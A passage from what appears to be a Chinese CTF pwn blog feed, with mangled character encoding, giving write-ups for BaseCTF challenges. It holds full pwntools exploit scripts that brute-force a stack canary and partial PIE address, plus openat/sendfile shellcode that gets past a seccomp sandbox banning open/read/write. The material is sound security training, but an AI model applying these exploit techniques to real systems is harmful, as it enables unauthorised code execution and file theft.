class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = libc.rand() % <span class="number">50</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">srand æ­é… rand</span></span><br><span class="line"><span class="string">srandom æ­é… random</span></span><br><span class="line"><span class="string">å‰è€…å®‰å…¨æ€§å·®</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div><ul><li>ç¬¬äºŒæ­¥å°±æ˜¯çˆ†ç ´canaryï¼Œcanaryæœ€åä¸€å­—èŠ‚è‚¯å®šæ˜¯\x00ï¼Œæ‰€ä»¥è¿˜éœ€è¦çˆ†ç ´ä¸ƒä½ï¼Œå› æ­¤å› å¥—ä¸¤å±‚å¾ªç¯ï¼Œæ³¨æ„æ¯ä¸€æ¬¡éƒ½éœ€è¦æ¨¡æ‹Ÿéšæœºæ•°ï¼š</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">        num = elf1.rand() % <span class="number">50</span>       </span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;BaseCTF&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + p8(i) <span class="comment"># å•å­—èŠ‚çˆ†ç ´</span></span><br><span class="line">        p.send(payload)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        rev = p.readline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rev: <span class="comment"># ä¸€ä½å‡ºé”™ç«‹é©¬stack_chk_fail</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;ç¬¬<span class="subst">&#123;j+<span class="number">1</span>&#125;</span>ä½æ˜¯<span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">            canary += p8(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary is <span class="subst">&#123;<span class="built_in">hex</span>(u64(canary))&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬<span class="number">1</span>ä½æ˜¯<span class="number">0xeb</span></span><br><span class="line">ç¬¬<span class="number">2</span>ä½æ˜¯<span class="number">0x9</span></span><br><span class="line">ç¬¬<span class="number">3</span>ä½æ˜¯<span class="number">0x27</span></span><br><span class="line">ç¬¬<span class="number">4</span>ä½æ˜¯<span class="number">0xbe</span></span><br><span class="line">ç¬¬<span class="number">5</span>ä½æ˜¯<span class="number">0xab</span></span><br><span class="line">ç¬¬<span class="number">6</span>ä½æ˜¯<span class="number">0x48</span></span><br><span class="line">ç¬¬<span class="number">7</span>ä½æ˜¯<span class="number">0xde</span></span><br><span class="line">canary <span class="keyword">is</span> <span class="number">0xde48abbe2709eb00</span></span><br></pre></td></tr></table></figure></div><ul><li>canaryåˆ°æ‰‹äº†ï¼Œåªéœ€è¦å°†è¿”å›åœ°å€å<strong>ä¸¤å­—èŠ‚æ”¹ä¸ºshellçš„åœ°å€</strong>ï¼Œä½†æ˜¯è¦æ³¨æ„å¹¶ä¸æ˜¯è¿”å›åˆ°push rbpçš„ä½ç½®ï¼Œå› ä¸ºé‚£æ ·ç¨‹åºæ˜¯è·‘ä¸é€šçš„ï¼Œæ— æ³•è·å¾—flagï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å¾€ä¸‹é¢è¿™ä¸ªåœ°å€è·³å°±è¡Œäº†ï¼š</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000012A9 ; __unwind &#123;</span><br><span class="line">.text:00000000000012A9                 endbr64</span><br><span class="line">.text:00000000000012AD                 push    rbp</span><br><span class="line">.text:00000000000012AE                 mov     rbp, rsp</span><br><span class="line">.text:00000000000012B1  å¾€è¿™é‡Œå†™å³å¯     lea     rdi, command    ; &quot;/bin/cat flag&quot;</span><br><span class="line">.text:00000000000012B8                 call    _system</span><br><span class="line">.text:00000000000012BD                 nop</span><br><span class="line">.text:00000000000012BE                 pop     rbp</span><br><span class="line">.text:00000000000012BF                 retn</span><br><span class="line">.text:00000000000012BF ; &#125; // starts at 12A9</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># çˆ†ç ´pie</span></span><br><span class="line">shell = <span class="number">0x02B1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    num = elf1.rand() % <span class="number">50</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p16(shell) <span class="comment"># æ³¨æ„æ˜¯p16</span></span><br><span class="line">    <span class="comment"># åªéœ€è¦æ”¹æœ«å°¾ä¸¤å­—èŠ‚å°±å¯ä»¥äº†</span></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    rev = p.readline()</span><br><span class="line">    <span class="built_in">print</span>(rev)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;welcome&#x27;</span> <span class="keyword">in</span> rev:</span><br><span class="line">        p.readline()</span><br><span class="line">        shell += <span class="number">0x1000</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div><h1 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h1><ul><li>æ³¨æ„ï¼šæœ¬åœ°å¤ç°è¦åˆ›å»ºä¸€ä¸ªflagæ–‡ä»¶</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;challenge.basectf.fun&quot;,32079)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf1 = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1 = cdll.LoadLibrary(&quot;/home/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">seed = elf1.time(<span class="number">0</span>)</span><br><span class="line">elf1.srand(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†ç ´canary    </span></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">        num = elf1.rand() % <span class="number">50</span>       </span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;BaseCTF&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + p8(i)</span><br><span class="line">        p.send(payload)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        rev = p.readline()</span><br><span class="line">        <span class="comment">#rev = p.recv()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rev:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;ç¬¬<span class="subst">&#123;j+<span class="number">1</span>&#125;</span>ä½æ˜¯<span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">            canary += p8(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary is <span class="subst">&#123;<span class="built_in">hex</span>(u64(canary))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†ç ´pie</span></span><br><span class="line">shell = <span class="number">0x02B1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    num = elf1.rand() % <span class="number">50</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p16(shell)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    rev = p.readline()</span><br><span class="line">    <span class="built_in">print</span>(rev)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;welcome&#x27;</span> <span class="keyword">in</span> rev:</span><br><span class="line">        p.readline()</span><br><span class="line">        shell += <span class="number">0x1000</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ²™ç®±ç¦ç”¨ORW-BaseCTF</title>
      <link href="/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/"/>
      <url>/2024/09/18/%E6%B2%99%E7%AE%B1%E7%A6%81%E7%94%A8ORW-BaseCTF/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="å…¸å‹çš„æ²™ç®±ç¦ç”¨"><a href="#å…¸å‹çš„æ²™ç®±ç¦ç”¨" class="headerlink" title="å…¸å‹çš„æ²™ç®±ç¦ç”¨"></a>å…¸å‹çš„æ²™ç®±ç¦ç”¨</h1><p><a class="link" href="https://www.basectf.fun/games/1/challenges">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh">é¢˜è§£é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://blog.csdn.net/SUKI547/article/details/103315487">linux64ä½ç³»ç»Ÿè°ƒç”¨è¡¨ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a href="http://downbeat.top/2024/09/01/pwnable%E7%B3%BB%E5%88%97/">æœªç¦ç”¨ORW</a></p><h1 id="1-idaé€Ÿè§ˆ"><a href="#1-idaé€Ÿè§ˆ" class="headerlink" title="1.idaé€Ÿè§ˆ"></a>1.idaé€Ÿè§ˆ</h1><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your shellcode:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;read failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sandbox(); <span class="comment">// æ²™ç®±ç¦ç”¨</span></span><br><span class="line">  execute_shellcode(buf);</span><br><span class="line">  munmap(buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>å…¶å®æŒºæ˜æ˜¾çš„ï¼Œæˆ‘ä»¬åªè¦ç»•è¿‡æ²™ç®±çš„é™åˆ¶å³å¯ï¼Œä¸‹é¢çœ‹çœ‹æ²™ç®±ç¦ç”¨äº†ä»€ä¹ˆï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240918210028982.bmp"></p><ul><li><font color="red" size="4">ç¦ç”¨ORW</font></li></ul><h1 id="2-æ€è·¯"><a href="#2-æ€è·¯" class="headerlink" title="2.æ€è·¯"></a>2.æ€è·¯</h1><ul><li>æŒ‰ç…§å¼€å¤´é¢˜è§£å‡ºé¢˜äººçš„æ€è·¯æ¥çš„ï¼Œå…ˆç”¨openatæ‰“å¼€flagæ–‡ä»¶ï¼Œæ¥ç€ç”¨sendfileè¾“å‡ºflag</li><li>å¯¹äºè¿™ä¸¤ä¸ªå‡½æ•°çš„è§£é‡Šå¦‚ä¸‹(å¼•è‡ªgpt)</li></ul><h3 id="openat"><a href="#openat" class="headerlink" title="openat"></a>openat</h3><ul><li><code>openat</code> å‡½æ•°æ˜¯ Linux ç³»ç»Ÿè°ƒç”¨çš„ä¸€éƒ¨åˆ†ï¼Œç”¨æ¥æ‰“å¼€ä¸€ä¸ªç›¸å¯¹äºç›®å½•æ–‡ä»¶æè¿°ç¬¦çš„æ–‡ä»¶ã€‚åœ¨æ–‡ä»¶ç³»ç»Ÿæ“ä½œä¸­ï¼Œ<code>openat</code> æä¾›äº†ä¸€ç§çµæ´»çš„æ–¹å¼ï¼Œå…è®¸ä½ åœ¨ä¸€ä¸ªæŒ‡å®šçš„ç›®å½•ï¼ˆè€Œä¸æ˜¯å½“å‰å·¥ä½œç›®å½•ï¼‰å†…æ‰“å¼€æ–‡ä»¶ã€‚<code>openat</code> çš„ä½œç”¨å’Œ <code>open</code> ç±»ä¼¼ï¼Œä½† <code>openat</code> å…è®¸æŒ‡å®šä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆç›®å½•çš„æ–‡ä»¶æè¿°ç¬¦ï¼‰ï¼Œä»¥ä¾¿äºå¤„ç†ç›¸å¯¹è·¯å¾„çš„æ–‡ä»¶ã€‚</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">openat</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span></span>;</span><br><span class="line">dirfd: è¡¨ç¤ºç›®å½•çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å¦‚æœæ˜¯ AT_FDCWDï¼Œåˆ™ç›¸å¯¹è·¯å¾„æ˜¯ä»å½“å‰å·¥ä½œç›®å½•å¼€å§‹æŸ¥æ‰¾ã€‚</span><br><span class="line">pathname: è¦æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„,ä¾‹å¦‚<span class="string">&quot;/flag&quot;</span>ã€‚</span><br><span class="line">flags: æ–‡ä»¶æ‰“å¼€çš„æ ‡å¿—ï¼Œç±»ä¼¼äº open çš„æ ‡å¿—ï¼Œå¦‚ O_RDONLYã€O_WRONLYã€O_RDWRã€O_CREAT ç­‰ã€‚</span><br><span class="line">mode: æ–°æ–‡ä»¶çš„æƒé™ï¼Œä»…å½“ä½¿ç”¨ O_CREAT æ—¶æ‰éœ€è¦ã€‚</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š</span><br><span class="line">openat å‡½æ•°</span><br><span class="line">mov rax, 257          ; ç³»ç»Ÿè°ƒç”¨å· (openat)</span><br><span class="line">mov rdi, dirfd        ; ç›®å½•æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">mov rsi, pathname     ; æ–‡ä»¶è·¯å¾„</span><br><span class="line">mov rdx, flags        ; æ–‡ä»¶æ‰“å¼€æ ‡å¿—</span><br><span class="line">mov r10, mode         ; æ–‡ä»¶æƒé™ (å½“ä½¿ç”¨ O_CREAT æ—¶)</span><br><span class="line">syscall               ; æ‰§è¡Œç³»ç»Ÿè°ƒç”¨</span><br></pre></td></tr></table></figure></div><h3 id="sendfile"><a href="#sendfile" class="headerlink" title="sendfile"></a>sendfile</h3><ul><li><code>sendfile</code> æ˜¯ Linux çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºåœ¨ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¹‹é—´ä¼ è¾“æ•°æ®ã€‚å®ƒåœ¨å†…æ ¸ä¸­ç›´æ¥è¿›è¡Œæ–‡ä»¶æ•°æ®çš„ä¼ è¾“ï¼Œé¿å…äº†æ•°æ®ä»å†…æ ¸åˆ°ç”¨æˆ·ç©ºé—´çš„æ‹·è´ï¼Œä»è€Œæé«˜äº†æ€§èƒ½ã€‚å¸¸ç”¨äºç½‘ç»œæœåŠ¡å™¨ä¸­ï¼Œå°†æ–‡ä»¶å†…å®¹å¿«é€Ÿå‘é€åˆ°ç½‘ç»œå¥—æ¥å­—</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sendfile</span><span class="params">(<span class="type">int</span> out_fd, <span class="type">int</span> in_fd, <span class="type">off_t</span> *offset, <span class="type">size_t</span> count)</span>;</span><br><span class="line">out_fd: ç›®æ ‡æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªå¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦ï¼ˆsocketï¼‰ï¼Œè¡¨ç¤ºå°†æ•°æ®å‘é€åˆ°å“ªé‡Œã€‚</span><br><span class="line">in_fd: æºæ–‡ä»¶æè¿°ç¬¦ï¼Œè¡¨ç¤ºä»å“ªé‡Œè¯»å–æ•°æ®ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªæ™®é€šçš„æ–‡ä»¶ã€‚</span><br><span class="line">offset: æŒ‡å‘åç§»é‡çš„æŒ‡é’ˆï¼Œè¡¨ç¤ºä»æºæ–‡ä»¶çš„å“ªä¸ªä½ç½®å¼€å§‹è¯»å–ã€‚å¦‚æœä¸º <span class="literal">NULL</span>ï¼Œåˆ™ä»å½“å‰åç§»é‡å¼€å§‹è¯»å–ã€‚</span><br><span class="line">count: éœ€è¦ä¼ è¾“çš„å­—èŠ‚æ•°ã€‚</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 40          ; ç³»ç»Ÿè°ƒç”¨å· (sendfile)</span><br><span class="line">mov rdi, out_fd      ; ç›®æ ‡æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">mov rsi, in_fd       ; æºæ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">mov rdx, offset      ; æ–‡ä»¶åç§»é‡æŒ‡é’ˆ</span><br><span class="line">mov r10, count       ; ä¼ è¾“çš„å­—èŠ‚æ•°</span><br><span class="line">syscall              ; æ‰§è¡Œç³»ç»Ÿè°ƒç”¨</span><br></pre></td></tr></table></figure></div><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><ul><li>openat</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e ; flag</span><br><span class="line">push rax; raxå°†&quot;flag&quot;å…¥æ ˆ</span><br><span class="line">mov rsi, rsp; &quot;flag&quot;èµ‹å€¼ç»™rsi,å³æ–‡ä»¶è·¯å¾„</span><br><span class="line">xor rax, rax; æ¸…é›¶</span><br><span class="line">xor rdi, rdi; æ¸…é›¶</span><br><span class="line">sub rdi, 100; </span><br><span class="line">xor rdx, rdx; æ¸…é›¶</span><br><span class="line">mov r10, 7 ; rwxæƒé™</span><br><span class="line">mov rax, 0x101; ç³»ç»Ÿè°ƒç”¨å·</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></div><ul><li>sendfile</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,1; ç›®æ ‡æ–‡ä»¶æŒ‡å‘stdoutï¼Œæ ‡å‡†è¾“å‡º</span><br><span class="line">mov rsi,3   ; æºæ–‡ä»¶ï¼Œ0-stdin 1-stdout 2-stderr 3-flag</span><br><span class="line">mov rdx,0; åç§»é‡0</span><br><span class="line">mov r10,0x100; è¾“å‡ºå­—èŠ‚æ•°è®¾ç½®å¤§ä¸€ç‚¹</span><br><span class="line">push 40; ç³»ç»Ÿè°ƒç”¨å·</span><br><span class="line">pop rax</span><br><span class="line">syscall </span><br></pre></td></tr></table></figure></div><h1 id="3-å®Œæ•´EXP"><a href="#3-å®Œæ•´EXP" class="headerlink" title="3.å®Œæ•´EXP"></a>3.å®Œæ•´EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>,<span class="number">30343</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">shellcode = (<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e </span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov r10, 7</span></span><br><span class="line"><span class="string">    mov rax, 0x101</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,3   </span></span><br><span class="line"><span class="string">    mov rdx,0</span></span><br><span class="line"><span class="string">    mov r10,0x100</span></span><br><span class="line"><span class="string">    push 40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode))</span><br><span 